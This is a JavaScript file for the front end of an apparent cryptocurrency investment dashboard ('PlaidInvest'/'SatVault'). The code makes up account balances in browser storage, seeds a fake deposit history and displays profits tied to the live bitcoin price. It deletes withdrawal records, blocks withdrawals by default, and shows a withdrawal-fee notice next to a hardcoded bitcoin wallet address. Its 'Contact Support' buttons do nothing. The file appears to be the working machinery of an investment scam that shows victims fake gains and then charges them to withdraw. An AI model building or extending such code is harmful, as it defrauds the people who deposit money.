(function () {
  var site = window.SITE || { name: "Jerry McMillan", displayName: "Jerry McMillan", balanceUsd: 15500, btcPrice: 0 };

  function getActiveProfile() {
    if (window.SatVaultAuth && typeof SatVaultAuth.getActiveProfile === "function") {
      var profile = SatVaultAuth.getActiveProfile();
      if (profile) return profile;
    }
    if (site.profiles && site.profiles.length) return site.profiles[0];
    return {
      id: "jerry",
      displayName: site.displayName || "Jerry McMillan",
      balanceUsd: site.balanceUsd || 15500,
      currency: "USD",
      currencyLabel: "USD",
      asset: "BTC",
      stable: false,
      withdrawalsBlocked: true,
      withdrawModalTitle: "Withdrawals Blocked",
      withdrawModalBody: "Withdrawals are currently unavailable on your account. Please contact support for assistance.",
      initialDeposit: site.initialDeposit
    };
  }

  function profileId() {
    return getActiveProfile().id || "jerry";
  }

  function sk(base) {
    return "acct:" + profileId() + ":" + base;
  }

  function migrateLegacyJerryKeys() {
    var flag = "acctMigrateLegacyJerryV1";
    if (localStorage.getItem(flag) === "1") return;
    var map = {
      transactions: "acct:jerry:transactions",
      balanceUsd: "acct:jerry:balanceUsd",
      balanceUsdBook: "acct:jerry:balanceUsdBook",
      balanceBtcHoldings: "acct:jerry:balanceBtcHoldings"
    };
    Object.keys(map).forEach(function (legacy) {
      var value = localStorage.getItem(legacy);
      if (value == null) return;
      if (localStorage.getItem(map[legacy]) == null) {
        localStorage.setItem(map[legacy], value);
      }
    });
    localStorage.setItem(flag, "1");
  }

  migrateLegacyJerryKeys();

  var profile = getActiveProfile();
  var defaultBalance = Number(profile.balanceUsd);
  if (Number.isNaN(defaultBalance) || defaultBalance <= 0) defaultBalance = 15500;

  var holdingsKey = sk("balanceBtcHoldings");
  var bookKey = sk("balanceUsdBook");
  var balanceKey = sk("balanceUsd");
  var txKey = sk("transactions");

  function secureWrite(fn) {
    if (window.__runSecureWrite) return window.__runSecureWrite(fn);
    return fn();
  }

  function parseTxAmountEarly(tx) {
    if (tx && tx.amountUsd != null) return Math.abs(Number(tx.amountUsd)) || 0;
    var raw = String((tx && tx.amount) || "").replace(/[^0-9.\-]/g, "");
    var n = parseFloat(raw);
    return isNaN(n) ? 0 : Math.abs(n);
  }

  function formatMoneyAmount(n, opts) {
    opts = opts || {};
    var currency = opts.currency || profile.currencyLabel || profile.currency || "USD";
    var decimals = opts.decimals != null ? opts.decimals : 2;
    var formatted = Number(n).toLocaleString(undefined, {
      minimumFractionDigits: decimals,
      maximumFractionDigits: decimals
    });
    if (currency === "USDT") return formatted + " USDT";
    if (currency === "EUR") return "€" + formatted;
    if (currency === "GBP") return "£" + formatted;
    return "$" + formatted;
  }

  function formatTxAmount(usd, negative) {
    var currency = profile.currencyLabel || profile.currency || "USD";
    var formatted = Number(usd).toLocaleString(undefined, {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    });
    var sign = negative ? "-" : "+";
    if (currency === "USDT") return sign + formatted + " USDT";
    return sign + "$" + Number(usd).toLocaleString(undefined, { maximumFractionDigits: 0 });
  }

  function createInitialDepositTx() {
    var seed = (profile && profile.initialDeposit) || (window.SITE && SITE.initialDeposit) || {};
    var amount = Number(seed.amountUsd) > 0 ? Number(seed.amountUsd) : defaultBalance;
    var openedAt = Number(seed.createdAt) > 0 ? Number(seed.createdAt) : new Date(2026, 5, 24).getTime();
    var openedDate = seed.date || "24/06/2026";
    return {
      id: seed.id || "initial-deposit",
      seed: true,
      date: openedDate,
      createdAt: openedAt,
      completesAt: openedAt,
      amountUsd: amount,
      type: seed.type || "Deposit",
      asset: seed.asset || profile.asset || "BTC",
      amount: formatTxAmount(amount),
      status: seed.status || "Completed"
    };
  }

  function createSeedHistoryTxs() {
    var seeds = (profile && profile.seedHistory) || [];
    return seeds.map(function (seed) {
      var amount = Math.abs(Number(seed.amountUsd) || 0);
      var negative = seed.amountUsd < 0 || (seed.amount && String(seed.amount).indexOf("-") === 0) ||
        /tax|sent to tax/i.test(seed.type || "");
      return {
        id: seed.id,
        seed: true,
        date: seed.date,
        createdAt: seed.createdAt,
        completesAt: seed.completesAt || seed.createdAt,
        amountUsd: amount,
        type: seed.type,
        asset: seed.asset || profile.asset || "USDT",
        amount: seed.amount || formatTxAmount(amount, negative),
        status: seed.status || "Completed"
      };
    });
  }

  function reconcileTransactions(rawTxs) {
    var txs = Array.isArray(rawTxs) ? rawTxs.slice() : [];
    var initial = createInitialDepositTx();
    var seedHistory = createSeedHistoryTxs();
    var seedIds = {};
    seedIds[initial.id] = true;
    seedHistory.forEach(function (tx) { seedIds[tx.id] = true; });

    txs = txs.filter(function (tx) {
      if (!tx) return false;
      if (tx.type === "Withdrawal") return false;
      if (tx.seed || seedIds[tx.id]) return false;
      return true;
    });
    txs.push(initial);
    seedHistory.forEach(function (tx) { txs.push(tx); });
    txs.sort(function (a, b) {
      return (b.createdAt || 0) - (a.createdAt || 0);
    });
    return txs;
  }

  function persistTransactions(txs) {
    secureWrite(function () {
      localStorage.setItem(txKey, JSON.stringify(txs));
    });
  }

  function loadRawTransactions() {
    try {
      var raw = JSON.parse(localStorage.getItem(txKey) || "[]");
      return Array.isArray(raw) ? raw : [];
    } catch (e) {
      return [];
    }
  }

  function syncSiteState() {
    var versionKey = sk("stateVersion");
    var version = (profile && profile.stateVersion) || "1";
    var versionChanged = localStorage.getItem(versionKey) !== version;
    if (versionChanged) {
      localStorage.setItem(bookKey, String(defaultBalance));
      localStorage.setItem(balanceKey, String(defaultBalance));
      localStorage.removeItem(holdingsKey);
      localStorage.setItem(versionKey, version);
    }

    var book = Number(localStorage.getItem(bookKey));
    if (Number.isNaN(book) || book <= 0) {
      localStorage.setItem(bookKey, String(defaultBalance));
      localStorage.setItem(balanceKey, String(defaultBalance));
      localStorage.removeItem(holdingsKey);
    } else if (!localStorage.getItem(balanceKey)) {
      localStorage.setItem(balanceKey, String(book));
    }
    var raw = loadRawTransactions();
    var reconciled = reconcileTransactions(raw);
    var changed = JSON.stringify(raw) !== JSON.stringify(reconciled) || versionChanged;
    if (changed) persistTransactions(reconciled);
    return changed;
  }

  var siteStateChanged = syncSiteState();

  var stored = Number(localStorage.getItem(balanceKey));
  if (!Number.isNaN(stored) && stored > 0) site.balanceUsd = stored;
  else site.balanceUsd = defaultBalance;

  if (!localStorage.getItem(bookKey)) {
    localStorage.setItem(bookKey, String(site.balanceUsd || defaultBalance));
  }

  function getBookUsd() {
    var book = Number(localStorage.getItem(bookKey));
    if (!isNaN(book) && book > 0) return book;
    return site.balanceUsd || defaultBalance;
  }

  function getPrice() {
    if (profile.stable) return 1;
    if (window.BtcPrice && typeof BtcPrice.getLivePrice === "function") {
      return BtcPrice.getLivePrice();
    }
    return (window.BtcPrice && BtcPrice.price) || site.btcPrice || 0;
  }

  function getHoldings() {
    if (profile.stable) return getBookUsd();
    var storedHoldings = Number(localStorage.getItem(holdingsKey));
    if (!Number.isNaN(storedHoldings) && storedHoldings > 0) return storedHoldings;
    return null;
  }

  function ensureHoldings() {
    if (profile.stable) return getBookUsd();
    var holdings = getHoldings();
    var price = getPrice();
    if (!price) return holdings != null ? holdings : 0;
    if (holdings != null) return holdings;
    holdings = getBookUsd() / price;
    secureWrite(function () {
      localStorage.setItem(holdingsKey, String(holdings));
    });
    return holdings;
  }

  function getPortfolioUsd() {
    if (profile.stable) return getBookUsd();
    var price = getPrice();
    var holdings = ensureHoldings();
    if (!price || !holdings) return getBookUsd();
    return holdings * price;
  }

  function formatUsd(value) {
    return formatMoneyAmount(value);
  }

  function formatBtc(value) {
    return Number(value).toFixed(8) + " BTC";
  }

  function renderBalances() {
    var book = getBookUsd();
    var portfolioUsd = getPortfolioUsd();
    var displayBtc = 0;

    if (!profile.stable) {
      var price = getPrice();
      var holdings = ensureHoldings();
      displayBtc = holdings > 0 ? holdings : (price ? book / price : 0);
    }

    document.querySelectorAll("[data-balance-usd]").forEach(function (el) {
      el.textContent = formatUsd(portfolioUsd);
    });

    document.querySelectorAll("[data-balance-btc]").forEach(function (el) {
      if (profile.stable) {
        el.textContent = formatMoneyAmount(book, { currency: profile.currencyLabel || "USDT" });
      } else {
        el.textContent = displayBtc > 0 ? formatBtc(displayBtc) : "—";
      }
    });

    document.querySelectorAll("[data-deposits-total]").forEach(function (el) {
      el.textContent = formatUsd(book);
    });
  }

  window.refreshBtcBalances = renderBalances;
  if (window.BtcPrice) BtcPrice.start();
  renderBalances();

  var displayName = (window.SatVaultAuth && SatVaultAuth.getDisplayName())
    || profile.displayName
    || site.displayName
    || site.name
    || "Jerry McMillan";
  var platformName = site.platformName || "PlaidInvest";

  document.querySelectorAll("[data-logo-text]").forEach(function (el) {
    el.textContent = platformName;
  });

  document.querySelectorAll("[data-brand]").forEach(function (el) {
    if (!el.closest(".text-logo")) {
      el.textContent = platformName;
    }
  });
  document.querySelectorAll("[data-tagline]").forEach(function (el) {
    el.textContent = site.tagline;
  });
  document.querySelectorAll("[data-year]").forEach(function (el) {
    el.textContent = site.year;
  });
  document.querySelectorAll("[data-email]").forEach(function (el) {
    el.textContent = site.email;
    if (el.tagName === "A") el.href = "mailto:" + site.email;
  });

  document.querySelectorAll("[data-user-name]").forEach(function (el) {
    el.textContent = displayName;
  });

  if (site.images) {
    document.querySelectorAll("img[data-coin]").forEach(function (img) {
      var key = img.getAttribute("data-coin");
      if (site.images[key]) img.src = site.images[key];
    });
    var favicon = document.querySelector('link[rel="icon"]');
    if (favicon && site.images.favicon) favicon.href = site.images.favicon;
  }

  document.title = document.title.replace(/^(SatVault|BTC Invest|PlaidInvest)/, platformName);

  window.updateBalance = function (usd) {
    var price = getPrice();
    secureWrite(function () {
      localStorage.setItem(bookKey, String(usd));
      if (!profile.stable && price) {
        localStorage.setItem(holdingsKey, String(usd / price));
      }
      localStorage.setItem(balanceKey, String(usd));
    });
    site.balanceUsd = usd;
    renderBalances();
  };

  window.getWalletUsd = function () {
    return getBookUsd();
  };

  window.getPortfolioUsd = getPortfolioUsd;

  window.getWithdrawalFeeUsd = function () {
    var fee = site.withdrawalFeeUsd;
    return fee != null && !Number.isNaN(Number(fee)) ? Number(fee) : 500;
  };

  window.isWithdrawalsBlocked = function () {
    var active = getActiveProfile();
    if (active && active.withdrawalsBlocked != null) return !!active.withdrawalsBlocked;
    return !!(window.SITE && SITE.withdrawalsBlocked);
  };

  if (window.isWithdrawalsBlocked()) {
    document.documentElement.classList.add("withdrawals-blocked");
    document.body.classList.add("withdrawals-blocked");
  }

  window.getTotalProfit = function () {
    if (profile.stable) return 0;
    var portfolio = getPortfolioUsd();
    var book = getBookUsd();
    return Math.round((portfolio - book) * 100) / 100;
  };

  function formatMoney(n) {
    return formatMoneyAmount(n);
  }

  function parseTxAmount(tx) {
    if (tx && tx.amountUsd != null) return Math.abs(Number(tx.amountUsd)) || 0;
    var raw = String((tx && tx.amount) || "").replace(/[^0-9.\-]/g, "");
    var n = parseFloat(raw);
    return isNaN(n) ? 0 : Math.abs(n);
  }

  function getTransactions() {
    var raw = loadRawTransactions();
    var reconciled = reconcileTransactions(raw);
    if (JSON.stringify(raw) !== JSON.stringify(reconciled)) {
      persistTransactions(reconciled);
    }
    return reconciled.slice();
  }

  window.getTransactions = getTransactions;
  window.saveTransactions = function (txs) {
    persistTransactions(Array.isArray(txs) ? txs : []);
    document.dispatchEvent(new CustomEvent("transactionsUpdated"));
  };
  window.__reconcileTransactions = function () {
    getTransactions();
  };

  function getPendingWithdrawalTotal() {
    return getTransactions().filter(function (tx) {
      var status = ((tx && tx.status) || "").toLowerCase();
      return tx && tx.type === "Withdrawal" && (status === "pending" || status === "processing");
    }).reduce(function (sum, tx) {
      return sum + parseTxAmount(tx);
    }, 0);
  }

  window.getAvailableBalance = function () {
    var portfolio = getPortfolioUsd();
    var reserved = getPendingWithdrawalTotal();
    return Math.max(0, Math.round((portfolio - reserved) * 100) / 100);
  };

  function getInitialDepositAmount() {
    var seed = (profile && profile.initialDeposit) || (window.SITE && SITE.initialDeposit);
    var amount = seed && Number(seed.amountUsd);
    return amount > 0 ? amount : defaultBalance;
  }

  window.renderDashboardStats = function () {
    var txs = getTransactions();
    var deposit = 0;
    var withdraw = 0;

    txs.forEach(function (tx) {
      if (!tx) return;
      var status = ((tx.status || "") + "").toLowerCase();
      if (status !== "completed") return;
      var amt = parseTxAmount(tx);
      if (tx.type === "Deposit") deposit += amt;
      else if (tx.type === "Withdrawal") withdraw += amt;
    });

    if (deposit <= 0) {
      deposit = getInitialDepositAmount();
    }

    var available = getAvailableBalance();
    var profit = getTotalProfit();

    function set(id, value) {
      var node = document.getElementById(id);
      if (node) node.textContent = value;
    }

    set("dash-stat-profit", formatMoney(profit));
    set("dash-stat-profit-desktop", formatMoney(profit));
    set("dash-stat-bonus", formatMoney(0));
    set("dash-stat-deposit", formatMoney(deposit));
    set("dash-stat-withdraw", formatMoney(withdraw));

    var availEl = document.getElementById("dash-available-amt");
    if (availEl) availEl.textContent = formatMoney(available);

    var withdrawAvail = document.getElementById("withdraw-available");
    if (withdrawAvail) withdrawAvail.textContent = formatMoney(available);

    var withdrawInput = document.getElementById("withdraw-amount");
    if (withdrawInput) withdrawInput.max = Math.max(100, Math.floor(available));
  };

  window.fillWalletFields = function () {
    var wallet = site.platformWallet || "bc1qa348fll9sh34h8gxux8dwfu4ygmwpe7v4nmyz2";
    var fee = getWithdrawalFeeUsd();
    document.querySelectorAll("[data-platform-wallet]").forEach(function (el) {
      el.textContent = wallet;
    });
    document.querySelectorAll("[data-withdrawal-fee]").forEach(function (el) {
      el.textContent = formatMoney(fee);
    });
  };

  fillWalletFields();
  document.addEventListener("transactionsUpdated", renderDashboardStats);

  if (window.BtcPrice) {
    var prevStatsOnLive = BtcPrice.onLivePrice;
    BtcPrice.onLivePrice = function (price, oldPrice) {
      if (typeof prevStatsOnLive === "function") prevStatsOnLive(price, oldPrice);
      renderBalances();
      renderDashboardStats();
    };
  }

  function processPendingTransactions() {
    var txs;
    try {
      txs = JSON.parse(localStorage.getItem(txKey) || "[]");
    } catch (e) {
      return false;
    }
    var now = Date.now();
    var changed = false;
    var balanceDelta = 0;

    txs = txs.map(function (tx) {
      var status = ((tx && tx.status) || "").toLowerCase();
      if (status !== "pending" && status !== "processing") return tx;

      if (!tx.completesAt) {
        tx = Object.assign({}, tx, {
          createdAt: tx.createdAt || now,
          completesAt: now + (10 + Math.random() * 10) * 60 * 1000,
          amountUsd: tx.amountUsd != null ? tx.amountUsd : parseTxAmount(tx)
        });
        changed = true;
      }

      if (now < tx.completesAt) return tx;

      var amt = parseTxAmount(tx);
      if (tx.type === "Deposit") balanceDelta += amt;
      else if (tx.type === "Withdrawal") balanceDelta -= amt;

      changed = true;
      return Object.assign({}, tx, { status: "Completed" });
    });

    if (changed) {
      secureWrite(function () {
        localStorage.setItem(txKey, JSON.stringify(txs));
      });
    }
    if (balanceDelta !== 0) {
      var base = Number(localStorage.getItem(bookKey));
      if (Number.isNaN(base)) base = getBookUsd();
      updateBalance(base + balanceDelta);
    } else if (changed) {
      renderBalances();
    }

    if (changed) {
      document.dispatchEvent(new CustomEvent("transactionsUpdated"));
    }
    return changed;
  }

  window.processPendingTransactions = processPendingTransactions;
  processPendingTransactions();
  renderDashboardStats();
  if (siteStateChanged) {
    document.dispatchEvent(new CustomEvent("transactionsUpdated"));
  }
  setInterval(processPendingTransactions, 30000);

  function getWithdrawModalCopy() {
    var active = getActiveProfile();
    var title = (active && active.withdrawModalTitle) || "Withdrawals Blocked";
    var body = (active && active.withdrawModalBody) ||
      "Withdrawals are currently unavailable on your account. Please contact support for assistance.";
    if (active && active.withdrawFeeAmount) {
      var feeAmount = Number(active.withdrawFeeAmount).toLocaleString(undefined, { maximumFractionDigits: 0 });
      var feeLabel = active.withdrawFeeCurrency === "GBP"
        ? ("£" + feeAmount)
        : active.withdrawFeeCurrency === "EUR"
          ? ("€" + feeAmount)
          : ("$" + feeAmount);
      title = active.withdrawModalTitle || "Withdrawal Fee";
      body = active.withdrawModalBody || ("Withdrawal fee is " + feeLabel + ".");
    }
    return { title: title, body: body };
  }

  function ensureWithdrawBlockedModal() {
    if (document.getElementById("withdraw-blocked-modal")) return;
    var copy = getWithdrawModalCopy();
    document.body.insertAdjacentHTML("beforeend",
      '<div id="withdraw-blocked-modal" class="wallet-modal hidden" role="dialog" aria-modal="true" aria-labelledby="withdraw-blocked-title">' +
        '<div class="wallet-modal-backdrop" data-withdraw-blocked-close></div>' +
        '<div class="wallet-modal-card app-card">' +
          '<h2 id="withdraw-blocked-title" class="wallet-modal-title">' + copy.title + "</h2>" +
          '<p id="withdraw-blocked-body" class="wallet-modal-body text-gray-400 text-sm">' + copy.body + "</p>" +
          '<div class="wallet-modal-actions">' +
            '<button type="button" class="btn-ghost" data-withdraw-blocked-close>Close</button>' +
            '<button type="button" class="btn-primary" id="withdraw-blocked-support">Contact Support</button>' +
          "</div>" +
        "</div>" +
      "</div>"
    );
    document.querySelectorAll("[data-withdraw-blocked-close]").forEach(function (el) {
      el.addEventListener("click", closeWithdrawBlockedModal);
    });
    var supportBtn = document.getElementById("withdraw-blocked-support");
    if (supportBtn) {
      supportBtn.addEventListener("click", function (e) {
        e.preventDefault();
      });
    }
    document.addEventListener("keydown", function (e) {
      if (e.key === "Escape") {
        closeWithdrawBlockedModal();
        closeDepositBlockedModal();
      }
    });
  }

  function openWithdrawBlockedModal() {
    ensureWithdrawBlockedModal();
    var copy = getWithdrawModalCopy();
    var title = document.getElementById("withdraw-blocked-title");
    var body = document.getElementById("withdraw-blocked-body");
    if (title) title.textContent = copy.title;
    if (body) body.textContent = copy.body;
    document.getElementById("withdraw-blocked-modal").classList.remove("hidden");
    document.body.classList.add("wallet-modal-open");
  }

  function closeWithdrawBlockedModal() {
    var modal = document.getElementById("withdraw-blocked-modal");
    if (modal) modal.classList.add("hidden");
    if (!document.getElementById("deposit-blocked-modal") ||
        document.getElementById("deposit-blocked-modal").classList.contains("hidden")) {
      document.body.classList.remove("wallet-modal-open");
    }
  }

  window.showWithdrawBlockedModal = openWithdrawBlockedModal;
  window.closeWithdrawBlockedModal = closeWithdrawBlockedModal;

  window.isDepositsBlocked = function () {
    var active = getActiveProfile();
    return !!(active && active.depositsBlocked);
  };

  function getDepositModalCopy() {
    var active = getActiveProfile();
    return {
      title: (active && active.depositModalTitle) || "Deposits Unavailable",
      body: (active && active.depositModalBody) ||
        "Deposits are currently unavailable on your account. Please contact support for assistance."
    };
  }

  function ensureDepositBlockedModal() {
    if (document.getElementById("deposit-blocked-modal")) return;
    var copy = getDepositModalCopy();
    document.body.insertAdjacentHTML("beforeend",
      '<div id="deposit-blocked-modal" class="wallet-modal hidden" role="dialog" aria-modal="true" aria-labelledby="deposit-blocked-title">' +
        '<div class="wallet-modal-backdrop" data-deposit-blocked-close></div>' +
        '<div class="wallet-modal-card app-card">' +
          '<h2 id="deposit-blocked-title" class="wallet-modal-title">' + copy.title + "</h2>" +
          '<p id="deposit-blocked-body" class="wallet-modal-body text-gray-400 text-sm">' + copy.body + "</p>" +
          '<div class="wallet-modal-actions">' +
            '<button type="button" class="btn-ghost" data-deposit-blocked-close>Close</button>' +
            '<button type="button" class="btn-primary" id="deposit-blocked-support">Contact Support</button>' +
          "</div>" +
        "</div>" +
      "</div>"
    );
    document.querySelectorAll("[data-deposit-blocked-close]").forEach(function (el) {
      el.addEventListener("click", closeDepositBlockedModal);
    });
    var supportBtn = document.getElementById("deposit-blocked-support");
    if (supportBtn) {
      supportBtn.addEventListener("click", function (e) {
        e.preventDefault();
      });
    }
  }

  function openDepositBlockedModal() {
    ensureDepositBlockedModal();
    var copy = getDepositModalCopy();
    var title = document.getElementById("deposit-blocked-title");
    var body = document.getElementById("deposit-blocked-body");
    if (title) title.textContent = copy.title;
    if (body) body.textContent = copy.body;
    document.getElementById("deposit-blocked-modal").classList.remove("hidden");
    document.body.classList.add("wallet-modal-open");
  }

  function closeDepositBlockedModal() {
    var modal = document.getElementById("deposit-blocked-modal");
    if (modal) modal.classList.add("hidden");
    if (!document.getElementById("withdraw-blocked-modal") ||
        document.getElementById("withdraw-blocked-modal").classList.contains("hidden")) {
      document.body.classList.remove("wallet-modal-open");
    }
  }

  window.showDepositBlockedModal = openDepositBlockedModal;
  window.closeDepositBlockedModal = closeDepositBlockedModal;

  function initWithdrawBlockedLinks() {
    document.addEventListener("click", function (e) {
      var link = e.target.closest(".nav-withdraw-link, .dash-withdraw-link, [data-withdraw-link]");
      if (!link || !window.isWithdrawalsBlocked()) return;
      e.preventDefault();
      openWithdrawBlockedModal();
    });
  }

  function initDepositBlockedLinks() {
    document.addEventListener("click", function (e) {
      if (!window.isDepositsBlocked()) return;
      var link = e.target.closest('a[href*="/dashboard/deposits"], .nav-deposit-link, .dash-deposit-link, [data-deposit-link]');
      if (!link) return;
      e.preventDefault();
      openDepositBlockedModal();
    });
  }

  if (window.isWithdrawalsBlocked()) {
    initWithdrawBlockedLinks();
    if (location.pathname.indexOf("/dashboard/withdrawals") !== -1) {
      openWithdrawBlockedModal();
    }
  }

  if (window.isDepositsBlocked()) {
    document.documentElement.classList.add("deposits-blocked");
    document.body.classList.add("deposits-blocked");
    initDepositBlockedLinks();
    if (location.pathname.indexOf("/dashboard/deposits") !== -1) {
      openDepositBlockedModal();
    }
  }

  if (window.__sealSecureStorage) window.__sealSecureStorage();
})();
